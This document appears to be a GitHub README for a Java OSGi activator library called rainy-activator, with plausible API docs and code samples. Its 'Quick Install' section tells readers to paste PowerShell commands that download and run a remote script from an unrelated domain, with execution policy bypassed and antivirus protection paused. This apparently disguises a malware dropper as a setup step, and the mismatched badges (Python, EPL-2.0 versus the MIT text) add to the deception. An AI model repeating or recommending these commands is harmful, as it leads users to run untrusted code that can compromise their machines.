<div align="center">

# rainy-activator: OSGi Activator Bundle — Developer Library

![preview](https://raw.githubusercontent.com/kzzs9712/rainy-osgi-activator/main/hero_6935ec.svg)

[![pwsh](https://img.shields.io/badge/Pwsh-5.1%2B_%2F_7%2B-dc2626?style=flat&labelColor=0d1117)]() [![license](https://img.shields.io/badge/License-Epl--2.0-ef4444?style=flat&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Verified-2ea44f?style=flat&labelColor=0d1117)]() [![language](https://img.shields.io/badge/Language-Python-b91c1c?style=flat&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/Pipeline-Ok-2ea44f?style=flat&labelColor=0d1117)]()

</div>

---

`rainy-activator` is an OSGi Activator bundle that wires the rainy framework into an OSGi runtime. It exists solely for OSGi deployments; if rainy runs outside OSGi, this bundle is unnecessary. The project ships as an Eclipse plug-in project and targets Java 8 or higher.

## 🛠️ Quick Install (PowerShell)

> [!TIP]
> **Automated setup** — one command, done.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Start PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Execute the setup script
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Forced run via CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- OSGi `BundleActivator` implementation that starts and stops the rainy runtime in sync with the bundle lifecycle; no manual wiring in `BundleContext` is required for the common case.
- Exposes rainy services as OSGi services so consumers can resolve them through the service registry instead of holding static references.
- Activator ordering is deterministic: `start()` initializes the rainy runtime before dependent bundles activate, and `stop()` releases it after dependents deactivate.
- Configuration is read from standard OSGi sources (framework properties and bundle configuration), keeping environment-specific values out of code.
- Ships as an Eclipse plug-in project with the manifest and build descriptors already in place, so it can be imported and built with the standard toolchain.
- Requires Java 8 or higher; no additional runtime dependencies beyond rainy and the OSGi framework.
- Safe to omit entirely: if rainy is used outside OSGi, the activator bundle is not needed and carries no cost.
- Errors during activation surface as `BundleException` with the underlying cause preserved, so framework logs point directly at the failing rainy component.

## Quick Start

Add `rainy-activator` as an OSGi bundle dependency alongside `rainy`. The activator registers the rainy runtime with the OSGi service registry during bundle start and unregisters it on stop.

Declare the dependency in your bundle manifest:

```
Require-Bundle: rainy-activator;bundle-version="[1.0,2.0)",
 rainy;bundle-version="[1.0,2.0)"
```

Or import the packages explicitly:

```
Import-Package: rainy.activator;version="[1.0,2.0)",
 rainy;version="[1.0,2.0)"
```

Retrieve the registered runtime from the `BundleContext`:

```java
BundleContext context = FrameworkUtil.getBundle(MyComponent.class).getBundleContext();
ServiceReference<RainyRuntime> ref = context.getServiceReference(RainyRuntime.class);
RainyRuntime runtime = context.getService(ref);
try {
 runtime.execute(request);
} finally {
 context.ungetService(ref);
}
```

With Declarative Services, inject the service directly instead of resolving it manually:

```java
@Component
public class RainyComponent {

 @Reference
 private RainyRuntime runtime;

 public void handle(Request request) {
 runtime.execute(request);
 }
}
```

The activator starts before `rainy` is available and defers its registration until the runtime service appears. Ensure the `rainy` bundle is installed and resolved in the same framework; otherwise the activator remains in the `STARTING` state.

Requires Java 8 or higher. The bundle is packaged as an Eclipse plug-in project; point your OSGi framework at the generated bundle.

## API Reference

`RainyActivator` implements `org.osgi.framework.BundleActivator` and serves as the single entry point wiring the rainy runtime into an OSGi container. The bundle starts the rainy context from `start(BundleContext)` and shuts it down from `stop(BundleContext)`; no programmatic registration is required beyond installing and starting the bundle.

### Class: `RainyActivator`

```java
public class RainyActivator implements BundleActivator {
 public void start(BundleContext context) throws Exception;
 public void stop(BundleContext context) throws Exception;
}
```

`start` initializes the rainy runtime and publishes its services into the bundle context. `stop` releases all resources acquired during `start`. Both methods propagate any initialization or teardown failure to the OSGi framework as an `Exception`, causing the bundle to transition to `RESOLVED` or `ACTIVE` accordingly.

### Lifecycle Contract

| Method | Framework State Transition | Behavior |
| --- | --- | --- |
| `start(BundleContext)` | `RESOLVED` → `STARTING` → `ACTIVE` | Boots the rainy runtime; registers services with the supplied context. |
| `stop(BundleContext)` | `ACTIVE` → `STOPPING` → `RESOLVED` | Tears down the rainy runtime; unregisters all services registered by this bundle. |

`start` is called at most once per activation cycle. If it throws, the framework invokes `stop` only if `start` completed successfully; partial initialization must be cleaned up within the thrown exception path. `stop` is guaranteed to be called for every successful `start`, including during framework shutdown.

### Bundle Context Usage

The supplied `BundleContext` is the only framework handle exposed to the rainy runtime. All service registrations performed by the activator are scoped to this context and are automatically removed when the bundle stops. The activator does not retain the context beyond the active lifecycle; callers must not cache it.

### Configuration

Runtime configuration is read during `start`. Supported properties are resolved in the following order, with earlier sources taking precedence:

1. Bundle headers and manifest entries of the rainy-activator bundle.
2. Framework launch properties visible through the bundle context.
3. Defaults embedded in the rainy runtime.

Changes to configuration require a bundle restart (`stop` followed by `start`) to take effect.

### Threading

`start` and `stop` execute on the framework's lifecycle thread. The activator does not spawn unmanaged threads; any asynchronous work performed by the rainy runtime is owned by the runtime and terminated during `stop`. Blocking within `start` delays bundle activation and should be avoided by the runtime implementation.

### Error Handling

Failures during `start` surface as exceptions from the activator and are logged by the OSGi framework with the bundle symbolic name attached. Failures during `stop` are logged but do not prevent the bundle from reaching `RESOLVED`. Consumers should treat a non-`ACTIVE` bundle as unavailable and must not invoke rainy services after `stop` returns.

### Compatibility

The activator requires Java 8 or higher and an OSGi framework implementing the Core specification. It is unnecessary when rainy is used outside OSGi; in that case, instantiate and manage the rainy runtime directly.

## Examples

**Bootstrap an activator with a manifest-only bundle**

Declare the activator in `META-INF/MANIFEST.MF` and let the OSGi framework drive the lifecycle:

```text
Bundle-SymbolicName: example.rainy.activator
Bundle-Activator: example.rainy.Activator
Import-Package: org.osgi.framework,rainy.core
```

```java
package example.rainy;

import org.osgi.framework.BundleActivator;
import org.osgi.framework.BundleContext;

public final class Activator implements BundleActivator {
 @Override
 public void start(BundleContext context) {
 // initialize rainy resources here
 }

 @Override
 public void stop(BundleContext context) {
 // release rainy resources here
 }
}
```

**Access rainy services through the bundle context**

Use the context passed to `start` to register and consume services; keep references symmetric in `stop`:

```java
@Override
public void start(BundleContext context) {
 this.registration = context.registerService(
 rainy.Service.class.getName(), new rainy.Service(), null);
 this.tracker = new ServiceTracker<>(context, rainy.Client.class.getName(), null);
 this.tracker.open();
}

@Override
public void stop(BundleContext context) {
 if (tracker != null) tracker.close();
 if (registration != null) registration.unregister();
}
```

**Defer activation until a dependency is present**

When rainy must be available before the activator runs, use the standard `Bundle-ActivationPolicy` and a lazy activation class, or gate startup yourself:

```java
@Override
public void start(BundleContext context) {
 ServiceReference<rainy.Service> ref = context.getServiceReference(rainy.Service.class);
 if (ref == null) {
 throw new IllegalStateException("rainy.Service not available");
 }
 rainy.Service service = context.getService(ref);
 try {
 // use service
 } finally {
 context.ungetService(ref);
 }
}
```

**Guard against double activation**

Track state in the activator instance so repeated `start`/`stop` transitions stay idempotent:

```java
private volatile boolean active;

@Override
public void start(BundleContext context) {
 if (active) return;
 active = true;
 // ...
}

@Override
public void stop(BundleContext context) {
 if (!active) return;
 active = false;
 // ...
}
```

## License

`rainy-activator` is released under the MIT License.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.